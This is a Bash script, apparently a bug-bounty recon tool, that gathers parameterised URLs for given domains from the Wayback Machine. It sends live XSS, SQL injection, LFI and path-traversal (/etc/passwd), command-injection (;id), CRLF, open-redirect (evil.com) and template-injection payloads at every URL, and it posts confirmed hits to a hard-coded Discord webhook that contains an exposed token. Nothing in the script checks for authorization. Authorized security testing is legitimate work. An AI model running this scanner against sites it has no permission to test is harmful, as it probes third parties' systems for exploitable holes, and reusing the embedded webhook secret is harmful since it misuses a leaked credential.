#!/bin/bash

WEBHOOK_URL="https://discord.com/api/webhooks/1404935825073901638/50GdR50Lm6iSeCEefDbtQoZxBPyXEpNt08ZgfNk6kqJPKJh0Z3sZvXcBCFWQ-AmxyXBR" # Ganti
TOOL_NAME="Bug Notification"

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

OUTPUT_DIR=""
MODE=""
TARGET_INPUT=""

show_help() {
    echo -e "${YELLOW}Usage:${NC} $0 [options]"
    echo "Options:"
    echo "  -u <domain>       Scan single domain"
    echo "  -l <file>         Scan list of domains from file"
    echo "  -o <folder>       Output folder name (default: batch_TIMESTAMP)"
    echo "  -h                Show this help"
    exit 1
}

# --- Parse Arguments ---
while [[ $# -gt 0 ]]; do
    case $1 in
        -u)
            MODE="single"
            TARGET_INPUT="$2"
            shift 2
            ;;
        -l)
            MODE="list"
            TARGET_INPUT="$2"
            shift 2
            ;;
        -o)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        -h|--help)
            show_help
            ;;
        *)
            echo -e "${RED}[!] Unknown option: $1${NC}"
            show_help
            ;;
    esac
done

# --- Validate Input ---
if [ -z "$MODE" ] || [ -z "$TARGET_INPUT" ]; then
    echo -e "${RED}[!] You must specify -u <domain> or -l <file>${NC}"
    show_help
fi

# --- Set Output Directory ---
if [ -z "$OUTPUT_DIR" ]; then
    TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
    OUTPUT_DIR="batch_${TIMESTAMP}"
fi
mkdir -p "$OUTPUT_DIR"

send_webhook() {
    local bug_type="$1"
    local url="$2"
    local domain="$3"
    curl -s -X POST -H "Content-Type: application/json" \
        -d "{\"content\":\"[$TOOL_NAME] **$bug_type** ditemukan di \`$domain\` → <$url>\"}" \
        "$WEBHOOK_URL" > /dev/null
}

confirm_reflection() {
    local marker="$1"
    local body="$2"
    if grep -q "$marker" <<< "$body"; then
        if grep -Eq "<[^>]*$marker|$marker[^<]*>" <<< "$body" || grep -Eq "<script[^>]*>.*$marker.*</script>" <<< "$body"; then
            return 0
        fi
    fi
    return 1
}

scan_domain() {
    DOMAIN=$1
    PARAM_FILE="$OUTPUT_DIR/params_$DOMAIN.txt"
    XSS_LOG="$OUTPUT_DIR/xss_$DOMAIN.txt"
    LFI_LOG="$OUTPUT_DIR/lfi_$DOMAIN.txt"
    SQLI_LOG="$OUTPUT_DIR/sqli_$DOMAIN.txt"
    OR_LOG="$OUTPUT_DIR/open_redirect_$DOMAIN.txt"
    CRLF_LOG="$OUTPUT_DIR/crlf_$DOMAIN.txt"
    PT_LOG="$OUTPUT_DIR/path_traversal_$DOMAIN.txt"
    CMDI_LOG="$OUTPUT_DIR/command_injection_$DOMAIN.txt"
    SSTI_LOG="$OUTPUT_DIR/ssti_$DOMAIN.txt"
    CSTI_LOG="$OUTPUT_DIR/csti_$DOMAIN.txt"

    echo -e "${YELLOW}[+] [$DOMAIN] Mengambil URL unik dari Wayback Machine...${NC}"
    waybackurls "$DOMAIN" \
    | grep "=" \
    | grep -Ev '\.(jpg|jpeg|png|gif|svg|ico|css|js|woff|woff2|ttf|eot|otf|mp4|webm|avi|mov|mp3|wav|pdf|doc|docx|xls|xlsx|zip|rar|7z|tar\.gz|txt)$' \
    | sort -u \
    | awk -F'?' '!seen[$1]++' > "$PARAM_FILE"

    echo -e "${YELLOW}[+] [$DOMAIN] Total URL unik: $(wc -l < "$PARAM_FILE")${NC}"

    # ===== XSS Verified =====
    > "$XSS_LOG"
    xss_payloads=('"><script>alert(1)</script>' "'\"><img src=x onerror=alert(2)>")
    while read -r url; do
        match_count=0
        for payload in "${xss_payloads[@]}"; do
            body=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "$payload")")
            if confirm_reflection "$payload" "$body"; then
                ((match_count++))
            fi
        done
        if [ "$match_count" -ge 2 ]; then
            echo -e "\033[0;32m[XSS] $url\033[0m"
            echo "$url" >> "$XSS_LOG"
            send_webhook "XSS" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== LFI Verified =====
    > "$LFI_LOG"
    lfi_payloads=("../../../../etc/passwd" "../../../../etc/hosts")
    while read -r url; do
        body1=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "${lfi_payloads[0]}")")
        if grep -q "root:x" <<< "$body1"; then
            body2=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "${lfi_payloads[1]}")")
            if grep -q "localhost" <<< "$body2"; then
                echo -e "\033[0;31m[LFI] $url\033[0m"
                echo "$url" >> "$LFI_LOG"
                send_webhook "LFI" "$url" "$DOMAIN"
            fi
        fi
    done < "$PARAM_FILE"

    # ===== SQLi Error-based =====
    > "$SQLI_LOG"
    while read -r url; do
        test_url=$(echo "$url" | qsreplace "' OR '1'='1")
        body=$(curl -sk --max-time 10 "$test_url")
        if grep -Eqi "sql syntax|mysql_fetch|ORA-|syntax error|unterminated" <<< "$body"; then
            echo -e "\033[0;35m[SQLi - Error] $url\033[0m"
            echo "[ERROR] $url" >> "$SQLI_LOG"
            send_webhook "SQLi - Error" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== SQLi Time-based Verified (pakai awk, bukan bc) =====
    time_payload_delay="1' AND SLEEP(5)-- -"
    time_payload_ctrl="1' AND SLEEP(0)-- -"
    while read -r url; do
        url_delay=$(echo "$url" | qsreplace "$time_payload_delay")
        url_ctrl=$(echo "$url" | qsreplace "$time_payload_ctrl")
        time1=$(curl -sk -o /dev/null -w "%{time_total}" --max-time 15 "$url_delay")
        time2=$(curl -sk -o /dev/null -w "%{time_total}" --max-time 15 "$url_ctrl")
        diff=$(awk "BEGIN {print $time1 - $time2}")
        if (( $(awk "BEGIN {print ($diff > 4)}") )); then
            echo -e "\033[0;35m[SQLi - Time Verified] $url ($diff s)\033[0m"
            echo "[TIME] $url ($diff s)" >> "$SQLI_LOG"
            send_webhook "SQLi - Time Verified (~$diff s)" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== Open Redirect =====
    > "$OR_LOG"
    while read -r url; do
        location=$(curl -sk -o /dev/null -w "%{redirect_url}" --max-time 10 "$(echo "$url" | qsreplace "https://evil.com")")
        if [[ "$location" == *"evil.com"* ]]; then
            echo -e "\033[0;34m[Open Redirect] $url\033[0m"
            echo "$url" >> "$OR_LOG"
            send_webhook "Open Redirect" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== CRLF =====
    > "$CRLF_LOG"
    while read -r url; do
        headers=$(curl -sk -D - --max-time 10 "$(echo "$url" | qsreplace "%0d%0aSet-Cookie:crlf=crlf")" -o /dev/null)
        if grep -qi "crlf=crlf" <<< "$headers"; then
            echo -e "\033[0;36m[CRLF] $url\033[0m"
            echo "$url" >> "$CRLF_LOG"
            send_webhook "CRLF" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== Path Traversal Verified =====
    > "$PT_LOG"
    pt_payloads=("../../../../../../etc/passwd" "../../../../../../etc/hosts")
    while read -r url; do
        body1=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "${pt_payloads[0]}")")
        if grep -q "root:x" <<< "$body1"; then
            body2=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "${pt_payloads[1]}")")
            if grep -q "localhost" <<< "$body2"; then
                echo -e "\033[0;31m[Path Traversal] $url\033[0m"
                echo "$url" >> "$PT_LOG"
                send_webhook "Path Traversal" "$url" "$DOMAIN"
            fi
        fi
    done < "$PARAM_FILE"

    # ===== Command Injection =====
    > "$CMDI_LOG"
    cmdi_payloads=(";id" "|id" "&&id")
    while read -r url; do
        for payload in "${cmdi_payloads[@]}"; do
            body=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "$payload")")
            if grep -q "uid=" <<< "$body"; then
                echo -e "\033[0;31m[Command Injection] $url\033[0m"
                echo "$url" >> "$CMDI_LOG"
                send_webhook "Command Injection" "$url" "$DOMAIN"
                break
            fi
        done
    done < "$PARAM_FILE"

    # ===== SSTI Verified =====
    > "$SSTI_LOG"
    ssti_payloads=('{{1111*1111}}SSTI_TEST' '${1111*1111}SSTI_TEST')
    while read -r url; do
        match_count=0
        for payload in "${ssti_payloads[@]}"; do
            body=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "$payload")")
            if grep -q "1234321SSTI_TEST" <<< "$body"; then
                ((match_count++))
            fi
        done
        if [ "$match_count" -ge 2 ]; then
            echo -e "\033[0;33m[SSTI] $url\033[0m"
            echo "$url" >> "$SSTI_LOG"
            send_webhook "SSTI" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"

    # ===== CSTI Verified =====
    > "$CSTI_LOG"
    csti_payloads=("{{'CSTI_TEST_98765'}}" "\${'CSTI_TEST_98765'}")
    while read -r url; do
        match_count=0
        for payload in "${csti_payloads[@]}"; do
            body=$(curl -sk --max-time 10 "$(echo "$url" | qsreplace "$payload")")
            if grep -q "CSTI_TEST_98765" <<< "$body"; then
                ((match_count++))
            fi
        done
        if [ "$match_count" -ge 2 ]; then
            echo -e "\033[0;33m[CSTI] $url\033[0m"
            echo "$url" >> "$CSTI_LOG"
            send_webhook "CSTI" "$url" "$DOMAIN"
        fi
    done < "$PARAM_FILE"
}

# --- Run Scan ---
if [ "$MODE" == "list" ]; then
    cat "$TARGET_INPUT" | sort -u | while read -r domain; do
        scan_domain "$domain"
    done
elif [ "$MODE" == "single" ]; then
    scan_domain "$TARGET_INPUT"
fi